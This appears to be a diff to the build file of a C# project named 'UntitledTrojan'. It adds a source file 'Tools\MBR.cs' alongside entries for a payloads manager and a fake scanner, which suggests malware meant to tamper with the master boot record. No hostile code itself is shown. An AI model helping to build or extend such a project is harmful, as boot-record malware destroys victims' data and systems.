@@ -91,6 +91,7 @@
     <Compile Include="Payloads\PayloadsManager.cs" />
     <Compile Include="Tools\Failsafe.cs" />
     <Compile Include="Tools\FileHelper.cs" />
+    <Compile Include="Tools\MBR.cs" />
     <Compile Include="UntitledTrojan.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
     <EmbeddedResource Include="FakeScanner.resx">
